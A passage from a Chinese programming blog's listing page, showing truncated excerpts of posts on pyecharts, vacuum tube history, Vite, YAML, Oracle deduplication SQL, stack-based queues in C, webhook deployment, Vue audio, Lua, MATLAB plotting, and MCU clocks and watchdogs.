label_opts = opts.LabelOpts（）可设置标签的样式
画图：
(ノ≧∇≦)ノ最后的效果为：
五.官方文档与社区
1.官方文档包含pyecharts中各个功能和图形的介绍和代码参数解析。
2.社区包含各种图形demo的项目案例代码和演示。
前言： 本文是分享一下自己学习数据可视化关于pyecharts的几个应用实例实践过程，我是数据可视化的萌新，如果出了什么问题，请各位多多担待，有什么关于这类案例需要什么补充的也可以多多留言喔（才不是不懂呢o(´^｀)o），谢谢观看！ヾ(≧∇≦谢谢≧∇≦)ノ
一.多重柱形图 1.首先将我们所需要的包导入一下，数据读取出来 import pandas as pd from pyecharts import options as opts from pyecharts.charts import Bar data_user = pd.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b56eeab65d134135570a28c3ed75d9d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/177bf88761d06852c44cce2f480297f8/" rel="bookmark">
			到底什么是电子管（真空管）？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		到底什么是电子管（真空管）？ 小枣君
​​
1883年，著名发明家托马斯·爱迪生（Thomas Edison）在一次实验中，观察到一种奇怪现象。
当时，他正在进行灯丝（碳丝）的寿命测试。在灯丝旁边，他放置了一根铜丝，但铜丝并没有接在任何电极上。也就是说，铜丝没有通电。
碳丝正常通电后，开始发光发热。过了一会，爱迪生断开电源。他无意中发现，铜丝上竟然也产生了电流。
爱迪生没有办法解释出现这种现象的原因，但是，作为一个精明的“商人”，他想到的第一件事，就是给这个发现申请专利。他还将这种现象，命名为“爱迪生效应”。
爱迪生
现在我们知道，爱迪生效应的本质，是热电子发射。也就是说，灯丝被加热后，表面的电子变得活跃，“逃”了出去，结果被金属铜丝捕获，从而产生了电流。
爱迪生申请专利之后，并没有想到这个效应有什么用途，于是将其束之高阁。
1884年，爱迪生电光公司的技术顾问、英国物理学家约翰·安布罗斯·弗莱明（John Ambrose Fleming）访问美国，与爱迪生进行会面。爱迪生向弗莱明展示了自己发现的爱迪生效应，给弗莱明留下了深刻的印象。
弗莱明
这个弗莱明，大家应该也比较熟悉。他是一个电学专家，也是一个电机工程师，我们中学经常使用的右手定则，就是他发明的。
除了传统电学之外，弗莱明其实还有一个强项，那就是无线电磁学。他年轻的时候，曾经师从麦克斯韦，专门学习无线电磁理论。麦克斯韦临终前上课，只有两个学生来听，其中一个，就是弗莱明。
弗莱明观摩了爱迪生效应的演示后，也没有想到这个效应到底能用来干啥。事实上，等到他真正用到它，已经是十几年后。
1896年，意大利人伽利尔摩·马可尼（Guglielmo Marconi）成功取得了世界上第一个无线电报系统专利，从而将人类带入无线通信时代。
马可尼
1899年，马可尼决定尝试横跨大西洋的远程无线电通信。为了完成这个壮举，他找来了弗莱明，和他签约，请他帮忙改进自己的无线电发射机和接收机。
弗莱明也确实没有辜负马可尼的期望，大幅改进了马可尼的设计，帮助实现了跨大西洋无线通信实验。（可惜，马可尼刻意对外隐瞒了弗莱明的贡献，还“忘记”了自己承诺要给弗莱明的500股股票奖励，把弗莱明气得半死。）
弗莱明在改进无线通信系统的时候，遇到了很多技术挑战。其中，最大的挑战，就是无线信号的接收。
简单来说，就是在接收端，如何检波信号，放大信号，让信号能够被完美解读。
放大信号大家都懂，那什么是检波信号呢？
所谓信号检波，其实就是信号筛选。天线接收到的信号，是非常杂乱的，什么信号都有。我们真正需要的信号（指定频率的信号），需要从这些杂乱信号中“过滤”出来，这就是检波。
想要实现检波，单向导通性（单向导电）是关键。
大家都知道，无线电磁波是高频振荡，每秒高达几十万次的频率。无线电磁波产生的感应电流，也随着“正、负、正、负”不断变化，如果我们用这个电流去驱动耳机，一正一负就是零，耳机就没办法反应出信号。
采用单向导电性，正弦波的负半周就没有了，全部是正的，电流方向一致，把高频过滤掉之后，耳机就能够轻松体现出电流的变化。
去掉负半周，电流方向变成一致的，容易解读
在这里，我要先给大家介绍一样东西——矿石检波器。
1874年，德国科学家卡尔·布劳恩（Karl Ferdinand Braun）发现，有一些天然矿石（金属硫化物）具有电流单向导通的特性，可以用于整流（将交流电变成直流电）。
1894年，英属印度物理学家贾格迪什·钱德拉·博斯（Jagadish Chandra Bose）基于卡尔·布劳恩的发现，利用方铅矿（硫化铅）的单向导电性，制成了世界上第一个检波器——矿石检波器。
1900年，美国人格林里夫·惠特勒·皮卡德（Greenleaf Whittier Pickard），基于矿石检波器，成功制造了世界上第一个矿石收音机。这为后来无线电广播的迅速普及奠定了基础。
弗莱明在研究如何改进无线电接收机的时候，采用了矿石检波器。但是，他想起了之前的爱迪生效应，他想到——是不是可以基于爱迪生效应的电子流动，设计一个新型的检波器呢？
就这样，1904年，世界上第一只真空电子二极管，在弗莱明的手下诞生了。当时，这个二极管也叫做“弗莱明阀”。（真空管，vacuum tube，也就是电子管，有时候也叫“胆管”。）
弗莱明发明的二极管
弗莱明的二极管，结构其实非常简单，就是真空玻璃灯泡里，塞了两个极：一个阴极（Cathode），加热后可以发射电子；一个阳极（Anode），接收电子。
旁热式二极管
玻璃管里之所以要抽成真空，是为了防止发生气体电离，对正常的电子流动造成影响，破坏特性曲线。（抽成真空，还可以有效降低灯丝的氧化损耗。）
二极管的出现，解决了检波和整流需求。但是，它还有改进的空间。
1899年，马可尼应邀到美国做无线电通讯表演。他的表演，吸引了一个年轻人的关注。这个年轻人，就是刚刚获得博士学位的德福雷斯特（De Forest Lee）。
德福雷斯特
德福雷斯特为马可尼的无线电感到着迷。于是，他投递简历，想要加入马可尼的公司。结果，遭到拒绝。
被拒绝之后，德福雷斯特没有放弃，而是继续研究无线电通信。他的目光，放在了弗莱明的二极管上。
1906年，德·福雷斯特在真空二极电子管里，巧妙地加了一个栅板（“栅极”），发明了真空三极电子管。
德·福雷斯特发明的三极管
栅板的主要作用，是控制电流。
栅极上很小的电流变化，能引起阳极很大的电流变化，而且，变化波形与栅极电流完全一致。所以， 三极管有信号放大的作用。
现在看来，真空三极管的发明，是电子工业领域的里程碑事件。
这个小小的元件，集检波、放大和振荡三种功能于一体，为电子技术的发展奠定了基础。
一开始的三极管是单栅，后来变成了两个板子夹在一起的双栅，再后来，干脆变成了整个包起来的围栅
真空管
真空三极管是那一时期电子工业的心脏。基于它，我们才有了性能越来越强大的广播电台、收音机、留声机、电影、电台、雷达、无线电对讲等。
真空管收音机的内部构造（可以看到很多个真空管）
德·福雷斯特发明了三极管之后，很快陷入与弗莱明以及马可尼公司的专利官司。
双方互相起诉，弗莱明认为德·福雷斯特侵犯了自己的二极管专利，而德·福雷斯特则认为自己的改进很大，足以形成新的专利。官司打了很久，最终，双方达成和解，相互授权对方生产二极管（三极管）。
三极管诞生后，因为能放大信号，所以受到了美国通信巨头AT&amp;T公司的关注。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/177bf88761d06852c44cce2f480297f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d92368214090a20912db6eebdb0e01d/" rel="bookmark">
			Vite教程 安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先先介绍一下vite，vite这个名字起源于法语就是很快的意思。应为他是冷服务不打包 用es6 import 来引入对应 的js。其次就是使用rollup 去打包。开发中有热更新等。
vite为何如此快 ------------ESBuild解析---------
ESBuild的特点
超快的构建速度 不需要缓存
支持ES6和commonjs模块化
支持Es6的Tree-shaking
支持GO， javascript的api
支持typescript和jsx等语法的编译
支持sourceMao
支持代码压缩
支持拓展其他插件
EsBuild的构建速度是 rollup+terser webpack parcel的几百倍
esbuild为什么这么快 ：因为是使用go语言编写的 直接转换为机器码 无需经过字节码 机器码直接在操作系统上执行
js代码执行： 代码–&gt;解析转换为asd树–&gt;字节码—&gt;读取字节码–&gt;在对字节码进行转换
会合理运用cup内核 尽可能饱和运行
esbuild所有的内容都是从0开始编写的 而不是使用的第三方 一开始就考虑到各种性能问题
-------------------------vite依赖了esbuild所以编译代码速度很快------------------
vite脚手架 在开发中 不可能所有的项目都是使用 vite从0开始去搭建的 比如 react vue
这时候 vite还提供了对应的脚手架工具
vite实际上有2个工具
1： vite:相当于一个构建工具 类似于webpack rollup
2：
@vitejs/create-app：类似于vue-cli create-react-app
使用脚手架工具
1: 这个做法省去了安装脚手架的过程
cnpm init @vitejs/app //此写法废弃了
npm create vite@latest//新写法
2:
2-1安装脚手架
cnpm i @vitejs/create-app -g
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d92368214090a20912db6eebdb0e01d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/84a6a3b7abbc28e61f8d374fada86460/" rel="bookmark">
			yaml 文件格式语法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. yaml文件格式是YAML (YAML Aint Markup Language)编写的文件格式，YAML是一种直观的数据序列化格式，可读性强，可被支持YAML库的不同的编程语言程序导入，如： C/C++, Ruby, Python, Java, Perl, C#, PHP等。它是以数据为核心的，比传统的xml方式更加简洁。其扩展名可以使用.yml或者.yaml。
2. 语法
2.1 常用数据格式
语法：key: value
示例：name: zhangsan
注意：value之前有一个空格
2.2 配置对象或map数据
语法：
key:
key1: value1
key2: value2
或者
key: {key1: value1,key2: value2}
示例：
person:
name: zhangsan
age: 30
addr: beijing
或者
person: {name: zhangsan,age: 30,addr: beijing}
2.3 配置List,Set数据
语法：
key:
- value1
- value2
或者
key: [value1,value2]
示例：
city:
- beijing
- tianjin
#或者
city: [beijing,tianjin]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/84a6a3b7abbc28e61f8d374fada86460/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/acd2a4f8115191889f7cabe27749b565/" rel="bookmark">
			oracle删除重复数据保留第一条记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		delete from 表名 a --create table 表名__bk_20230608 as --select * from 表名 a where (主键字段) in ( select 主键字段 from 表名 group by 主键字段 having count(*) &gt; 1 ) and rowid not in ( select min(rowid) from 表名 group by 主键字段 having count(*)&gt;1 ) oracle删除重复数据保留第一条记录
1、查找表中多余的重复记录，重复记录是根据单个字段（Id）来判断
select * from 表 where Id in (select Id from 表 group byId having count(Id) &gt; 1) 2、删除表中多余的重复记录，重复记录是根据单个字段（Id）来判断，只留有rowid最小的记录
DELETE from 表 WHERE (id) IN ( SELECT id FROM 表 GROUP BY id HAVING COUNT(id) &gt; 1) AND ROWID NOT IN (SELECT MIN(ROWID) FROM 表 GROUP BY id HAVING COUNT(*) &gt; 1); 3、查找表中多余的重复记录（多个字段）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/acd2a4f8115191889f7cabe27749b565/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/573c8ce716aebb09501973eeb9e10eee/" rel="bookmark">
			用栈实现队列 / 用队列实现栈
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		OJ题链接： 用栈实现队列
用队列实现栈
用栈实现队列 1.基本思想 我们需要实现队列的四种操作：增删查和判空。对于栈，我们增加元素和删除元素都只能从栈顶实现，并且只能返回栈顶的元素，而对于队列，以栈的视角来看，我们增加元素从栈顶插入，而删除和查找只能从栈底实现，所以我们的重点应放在如何获取和改变栈底的元素上。
我们构建两个栈，如果想获得栈底的元素，我们可以把栈1的元素全部“倒入”栈2中，便实现了栈的反转。
此时我们对栈二进行出栈的操作，就相当于删除了栈1栈尾的元素（也就是队列的删除） 而我们想插入，因为栈的插入和队列的插入是相同的，所以我们只需要把栈2的元素再倒回栈1，对栈1进行插入便可以了
但是，如果我们需要连续删除，需不需要倒来倒去呢？
我们发现，删除1之后，2成为了栈1栈底的元素。也就是说，无论我们进行多少次删除，栈2中栈顶的元素永远是栈1中栈底的元素，对栈2的出栈永远是队列的出队列
所以我们可以把栈1定义为入队列的栈，把栈2定义为出队列的栈，如果要入队列，只需要把栈2的元素全部倒入栈1，而如果要出队列，只需要把栈1的元素全部倒入栈2，然后进行入栈出栈的操作。
2.判空 如果入队列栈（栈1），出队列栈（栈2）都为空，队列自然也为空
3.增 如果出队列栈为空，则有两种情况：
队列为空元素全在入队列栈 而无论哪种情况，都可以直接将元素插入入队列栈
如果出队列栈不为空，则需先将出队列栈元素全部倒入入队列栈，然后再将元素插入入队列栈 4.删 如果入队列栈为空，则有两种情况
队列为空元素全在出队列栈 对于第一种情况，队列没有元素进行队列的删除，会发生报错
而对于第二种情况，可以直接将栈顶元素删除
如果入队列栈不为空，则需先将入队列栈元素全部倒入出队列栈，然后再将出队列栈栈顶元素删除。
5.查找队列头元素 和队列的删除一样，只不过我们不需要删除该元素，只需要返回出队列栈的栈顶元素便可
6.总代码实现 typedef int STDataType; typedef struct Stack { STDataType* a; int top;	// 栈顶 int capacity; // 容量 }Stack; // 初始化栈 void StackInit(Stack* ps) { STDataType* tmp = (STDataType*)malloc(sizeof(STDataType) * 4); ps-&gt;a = tmp; ps-&gt;top = 0; ps-&gt;capacity = 4; } // 入栈 void StackPush(Stack* ps, STDataType data) { if (ps-&gt;top == ps-&gt;capacity) { STDataType* tmp = (STDataType*)realloc(ps-&gt;a, sizeof(STDataType) * ps-&gt;capacity * 2); ps-&gt;a = tmp; ps-&gt;capacity *= 2; } (ps-&gt;a)[ps-&gt;top] = data; ps-&gt;top++; } // 出栈 void StackPop(Stack* ps) { assert(ps-&gt;top); ps-&gt;top--; } // 获取栈顶元素 STDataType StackTop(Stack* ps) { assert(ps-&gt;top); return (ps-&gt;a)[ps-&gt;top - 1]; } // 获取栈中有效元素个数 int StackSize(Stack* ps) { return ps-&gt;top; } // 检测栈是否为空，如果为空返回非零结果，如果不为空返回0 int StackEmpty(Stack* ps) { if (ps-&gt;top == 0) { return 1; } else { return 0; } } // 销毁栈 void StackDestroy(Stack* ps) { free(ps-&gt;a); ps-&gt;top = 0; ps-&gt;capacity = 0; } //队列的定义 typedef struct { Stack* Stack1;//入队列栈 Stack* Stack2;//出队列栈 } MyQueue; //队列的创建 MyQueue* myQueueCreate() { Stack* pstack1=(Stack*)malloc(sizeof(Stack)); Stack* pstack2=(Stack*)malloc(sizeof(Stack)); StackInit(pstack1); StackInit(pstack2); MyQueue* queue=(MyQueue*)malloc(sizeof(MyQueue)); queue-&gt;Stack1=pstack1; queue-&gt;Stack2=pstack2; return queue; } //队列的插入 void myQueuePush(MyQueue* obj, int x) { if(StackEmpty(obj-&gt;Stack1)) { while(!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/573c8ce716aebb09501973eeb9e10eee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/900443f460c01b970a37eacc24ff3b04/" rel="bookmark">
			使用 GitHub 和 Python 实现持续部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转自：https://www.weidianyuedu.com/
借助 GitHub 的网络钩子webhook，开发者可以创建很多有用的服务。从触发一个 Jenkins 实例上的 CI（持续集成） 任务到配置云中的机器，几乎有着无限的可能性。这篇教程将展示如何使用 Python 和 Flask 框架来搭建一个简单的持续部署（CD）服务。
在这个例子中的持续部署服务是一个简单的 Flask 应用，其带有接受 GitHub 的网络钩子webhook请求的 REST 端点endpoint。在验证每个请求都来自正确的 GitHub 仓库后，服务器将拉取pull更改到仓库的本地副本。这样每次一个新的提交commit推送到远程 GitHub 仓库，本地仓库就会自动更新。
Flask web 服务
用 Flask 搭建一个小的 web 服务非常简单。这里可以先看看项目的结构。
├── app
│ ├── init.py
│ └── webhooks.py
├── requirements.txt
└── wsgi.py
首先，创建应用。应用代码在 app 目录下。
两个文件（init.py 和 webhooks.py）构成了 Flask 应用。前者包含有创建 Flask 应用并为其添加配置的代码。后者有端点endpoint逻辑。这是该应用接收 GitHub 请求数据的地方。
这里是 app/init.py 的内容：
import os
from flask import Flask
from .webhooks import webhook
def create_app():
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/900443f460c01b970a37eacc24ff3b04/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a68874d25a2c705d62e818820ae0ee2/" rel="bookmark">
			windows git clone下载gitlab代码操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装git git下载地址
生成密钥 打开Git Bash
输入命令：ssh-keygen，生成密钥
用记事本打开生成的id_rsa.pub密钥文件，复制生成的密钥：
配置密钥 登录gitlab或者github：
配置ssh密钥：
clone 文件 在存储下载项目的文件夹下右键，打开Git Bash。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3410749cf05c9c8ffe470995d92cad8/" rel="bookmark">
			Vue实现动态src实现播放音频(audio标签)本地
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目场景： 技术场景：Vue2,iview
需求场景：公司项目要实现一个扫码枪录入条码，并在录入条码后动态播放一段音频。
问题描述 使用原生audio标签无法成功播放音频。
&lt;div&gt; &lt;audio controls ref="audio"&gt; &lt;source src="./扫描成功.mp3" /&gt; &lt;/audio&gt; &lt;/div&gt; 报错信息：
Uncaught (in promise) DOMException: Failed to load because no supported source was found. 原因分析： 无法读取音频文件；
音频文件需要import 或require()导入本地；
解决方案： 直接上代码咯！！
&lt;div&gt; &lt;audio controls ref="audio"&gt; &lt;source src="./扫描成功.mp3" /&gt; &lt;/audio&gt; &lt;/div&gt; &lt;z-button @click="play('扫描成功.mp3')"&gt;播放1&lt;/z-button&gt; &lt;z-button @click="play('未命名文本3.mp3')"&gt;播放2&lt;/z-button&gt; &lt;div&gt; &lt;script&gt; play(val) { let music = new Audio() // 这里获取播放路径 music = require(`./${val}`) this.$refs.audio.src = music this.$nextTick(res =&gt; { const { audio } = this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e3410749cf05c9c8ffe470995d92cad8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ed7e4129db286daee147fe2e2b86539/" rel="bookmark">
			《Lua程序设计》--学习2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		表 Lua语言中的表本质上是一种辅助数组（associative array），这种数组不仅可以使用数值作为索引，也可以使用字符串或其他任意类型的值作为索引（nil除外）。
Lua语言中的表要么是值要么是变量，它们都是对象（object），表是一种动态分配的对象，程序只能操作指向表的引用（或指针）。除此以外，Lua语言不会进行隐藏的拷贝（hidden copies）或创建新的表
对于一个表而言，当程序中不再有指向它的引用时，垃圾收集器会最终删除这个表并重用其占用的内存。
当语句 b = a，指的是b这个引用也指向了a指向的表，指向的是同一张表
表索引值 同一个表中存储的值可以具有不同的类型索引，并可以按需增长以容纳新的元素
将nil赋值给表元素可以将其删除，Lua语言实际上就是使用表来存储全局变量的
当把表当作结构体使用时，可以把索引当作成员名称使用
a.x代表的是a["x"]，即由字符串"x"索引的表；而a[x]则是指由变量x对应的值索引的表
2和2.0的值相等，所以当它们被当作表索引使用时指向的是同一个表元素，当被用作表索引时，任何能够被转换为整型的浮点数都会被转换成整型数
表构造器 表构造器（Table Constructor）是用来创建和初始化表的表达式
在同一个构造器中，可以混用记录式（record-style）和列表式（list-style）写法
通过方括号括起来的表达式显式的指定每一个索引
数组，列表和序列 如果想表示常见的数组（array）或列表（list），那么只需要使用整型作为索引的表即可
我们把这种所有元素都不为nil的数组称为序列（sequence），也就是整个数组是全部有效的，没有空洞，可以将末尾设置成nil来标记数组的长度
操作符 # 也可以用于表，返回表对应的序列的长度
对于中间存在空洞（nil值）的列表而言，序列长度操作时不可靠的
不包含数值类型的键的表就是长度为零的序列
遍历表 pairs 顺序是随机的，保证每个元素出现一次
ipairs 遍历，保证按顺序遍历
使用数值型for循环
安全访问 对表进行了6次访问，改写成下面这样
于表达式a or{}，当a为nil时其结果是一个空表
表中的每个字段名都只是用了一次，从而保证了尽可能少的对表进行访问，本例中访问了三次，同时避免了引入新的操作符
表标准函数 函数table.insert向序列的指定位置插入一个元素，其他元素依次后移
对于列表t={10,20,30}，在调用table.insert（t,1,15）后它会变成{15,10,20,30}
调用时不指定位置的话会直接插在末尾不移动任何元素
函数table.remove删除并返回序列指定位置的元素，然后将其后的元素向前移动填充删除元素后造成的空洞。如果在调用该函数时不指定位置，该函数会删除序列的最后一个元素
函数table.move（a,f,e,t），调用该函数可以将表a中从索引f到e的元素（包含索引f和索引e对应的元素本身）移动到位置t上，这样就可以空出第一个元素的位置，方便模拟栈
函数 当函数只有一个参数且该参数是字符串常量或表构造器时，括号是可选的：
Lua语言也为面向对象风格的调用（object-oriented call）提供了一种特殊的语法，即冒号操作符。形如o:foo（x）的表达式意为调用对象o的foo方法
一个Lua程序既可以调用Lua语言编写的函数，也可以调用C语言（或者宿主程序使用的其他任意语言）编写的函数
调用函数时使用的参数个数可以与定义函数时使用的参数个数不一致。Lua语言会通过抛弃多余参数和将不足的参数设为nil的方式来调整参数的个数。
多返回值 使用多重赋值（multipleassignment）可以同时获取到这两个结果：
Lua语言编写的函数同样可以返回多个结果，只需在return关键字后列出所有要返回的值即可
Lua语言根据函数的被调用情况调整返回值的数量。当函数被作为一条单独语句调用时，其所有返回值都会被丢弃；当函数被作为表达式（例如，加法的操作数）调用时，将只保留函数的第一个返回值。只有当函数调用是一系列表达式中的最后一个表达式（或是唯一一个表达式）时，其所有的返回值才能被获取到
在多重赋值中，如果一个函数调用是一系列表达式中的最后（或者是唯一）一个表达式，则该函数调用将产生尽可能多的返回值以匹配待赋值变量，否则只返回一个结果
当一个函数调用是另一个函数调用的最后一个（或者是唯一）实参时，第一个函数的所有返回值都会被作为实参传给第二个函数。我们已经见到过很多这样的代码结构，例如函数print。由于函数print能够接收可变数量的参数，所以print（g（））会打印出g返回的所有结果。
表构造器会完整地接收函数调用的所有返回值，而不会调整返回值的个数
不过，这种行为只有当函数调用是表达式列表中的最后一个时才有效，在其他位置上的函数调用总是只返回一个结果：
将函数调用用一对圆括号括起来可以强制其只返回一个结果
可变长参数函数 Lua语言中的函数可以是可变长参数函数（variadic），即可以支持数量可变的参数
我们将三个点组成的表达式称为可变长参数表达式（vararg expression）
具有可变长参数的函数也可以具有任意数量的固定参数，但固定参数必须放在变长参数之前。Lua语言会先将前面的参数赋给固定参数，然后将剩余的参数（如果有）作为可变长参数。
样。不过，在某些罕见的情况下，如果可变长参数中包含无效的nil，那么{...}获得的表可能不再是一个有效的序列。此时，就没有办法在表中判断原始参数究竟是不是以nil结尾的。对于这种情况，Lua语言提供了函数table.pack。该函数像表达式{...}一样保存所有的参数，然后将其放在一个表中返回，但是这个表还有一个保存了参数个数的额外字段"n"
另一种遍历函数的可变长参数的方法是使用函数select。函数select总是具有一个固定的参数selector，以及数量可变的参数。如果selector是数值n，那么函数select则返回第n个参数后的所有参数；否则，selector应该是字符串"#"，以便函数select返回额外参数的总数。
函数table.unpack 该函数的参数是一个数组，返回值为数组内的所有元素：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7ed7e4129db286daee147fe2e2b86539/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/671b2081145be688552b5d804222469c/" rel="bookmark">
			MATLAB绘图必看，画图大全！MATLAB绘图基础操作大全—折线图、散点图、颜色样式、线条粗细汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		提示：文章写完后，目录可以自动生成，如何生成可参考右边的帮助文档
文章目录 一、颜色大全二、线条符号大全2.折线图绘制 三、散点图绘制四、折线图绘制五、添加图例、题目、坐标轴（题目）六、画图时显示或隐藏坐标区域网格七、同一个图片绘制多个图像、绘制多幅图八、一个图窗绘制多幅图，多个图在一个图窗显示总结参考 一、颜色大全 颜色符号对应颜色r红色g绿色b蓝色c青绿色m粉红色y黄色k黑色w白色 二、线条符号大全 标记符号对应颜色＋加号o空心圆‘*’星号x叉d菱形^上三角形p(pentagram)五角星h(hexagram)六边形s(square)正方形 线性符号含义-实线(默认)–双划线:虚线:.点划线 2.折线图绘制 代码如下（示例）：
x1 = [50 60 70 80 90 96]; y1_A = [1.0159 1.2227 1.2755 1.2845 1.4111 1.5173]; plot(x1,y1_A,'-*','color','b','MarkerSize',8); 该处使用的url网络请求的数据。
三、散点图绘制 使用plot函数，不加线性符号即可
代码如下（示例）：
x1 = [50 60 70 80 90 96]; y1_A = [1.0159 1.2227 1.2755 1.2845 1.4111 1.5173]; plot(x1,y1_A,'*'); 四、折线图绘制 只要在散点图的基础上，加上线性符号，例如“-”即可，把相应的散点图改为折线图只需要在标记符号前面加上线型符号即可
代码如下（示例）：
x1 = [50 60 70 80 90 96]; y1_A = [1.0159 1.2227 1.2755 1.2845 1.4111 1.5173]; plot(x1,y1_A,'-*'); 五、添加图例、题目、坐标轴（题目） 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/671b2081145be688552b5d804222469c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2236d9336f34a0f3ceccacd5030a7839/" rel="bookmark">
			Excel问题记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		插件 E2D3 可视化插件 （word cloud） 在excel --&gt; 插入 --&gt; 加载项 中搜索E2D3
然后再任何一单元格点击下，进行点击可视化
之后点击单元格的部分就会出现，表头为name和value的初始化数据， 将自己的数据直接覆盖掉初始化的数据， 保留name， 和value，保存就可以了
关键问题 有时候可视化词云字段太长， 就会出现一个很长的”词“并且出现的频率很高，却没有显示。这时候可以通过放大和缩小进行调整。就很无语
问题 很抱歉,你的组织已禁用访问 Office 应用商店。请与管理员联系以申请访问权限。 因为我之前将我的Microsoft账号和学校邮箱进行关联， 所以office自动使用了学校邮箱账号， 导致出现这一错误。解决办法就是始终自己的个人账号。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5468eff66c7084554278b1d5862f37a/" rel="bookmark">
			时钟系统总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果把mcu比成人脑，那么时钟晶振就是人的心脏。😇
时钟源分类 a.石英晶体/晶振
Q值高，输出能力强，应用于要求低抖动的场合，在器件的外部使用，频率可达100MHz。
晶体（也可称为无源晶振），无源晶振应用压电效应的石英晶体进行工作，有源晶振内部封装了石英晶体、振荡电路、输出电平调节电路的模块来工作。
有源晶振，无源晶振的区别在于是否使用能源来显示其特性,无源晶振如电容，电阻，电感，二极管。有源晶体如三极管，场效应管。
具体可参考https://zhuanlan.zhihu.com/p/96164213
b.振荡器
RC，LC振荡器和晶体振荡器。
c.锁相环
锁相环的特点是：利用外部输入的参考信号控制环路内部振荡信号的频率和相位。可以实现输出信号频率对输入信号频率的自动跟踪，所以锁相环通常用于闭环跟踪电路。锁相环在工作的过程中，当输出信号的频率与输入信号的频率相等时，输出电压与输入电压保持固定的相位差值。
2、时钟信号 （1）高速外部时钟信号（HSE）
以外部晶振作时钟源，晶振频率可取范围为4~16MHz，一般采用8MHz的晶振。
（2）高速芯片内部时钟信号（HSI）
由内部8MHz的RC振荡器产生，起振较快，可直接作为系统时钟或在2分频后作为PLL输入，但不稳定。
（3）低速外部时钟信号(LSE)
以外部晶振作时钟源，主要提供给实时时钟模块，一般采用32768Hz。
（4）低速内部时钟信号(LSI)
由内部RC振荡器产生，主要提供给实时时钟模块，频率大约为40KHz。
3、应用 （1）高速时钟(HSE和HSI）为芯片提供主时钟，有时也可以提供给RTC。由于内部的晶振起振较快，时钟在芯片刚上电的时候，默认使用内部高速时钟HSI。由于外部的晶振精度高，较稳定，上电之后可通过软件配置，可使用外部时钟HSE信号。
（2）低速时钟(LSE和LSI)只是提供给芯片中的RTC(实时时钟)及独立看门狗使用。
推荐 https://blog.csdn.net/m0_58838850/article/details/126196369
重点：时钟树。
4、程序 /*SCLK_Value系统主时钟频率，MHZ*/
void SystemInit(uint8_t SCLK_Value)
{
/* 配置系统时钟源、PLL乘法器和分频器因子 */
SetSysClock(SCLK_Value);
}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a91d3a8a8872fcac51b86cc2d3551771/" rel="bookmark">
			看门狗watchdog
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、介绍 看门狗可以使系统在异常情况下能自动复位，是在一定时间内可以被复位的计数器。
1.从软硬件控制类型划分，看门狗可分为硬件狗和软件狗。
硬件看门狗：是利用一个定时器电路，其定时输出连接到电路的复位端,程序在一定时间范围内对定时器清零,使其不复位。
软件看门狗:将硬件电路上的定时器用mcu的内部定时器代替，类似一种监控软件，使用内部定时器对主程序的运行进行监控，对定时器的时间进行设定，当产生定时器中断时，设置一个变量，有一个初值，在程序的尾部观察其变量是否发生变化 ，如没有发生变化，则说明其发生了复位。
硬件看门狗比软件看门狗稳定，软件看门狗无法检测系统内部定时器自身发生故障。
2.又可分为独立看门狗和mcu自带的看门狗。
mcu自带的看门狗：实际上是mcu芯片自带的定时器，可随时禁用。
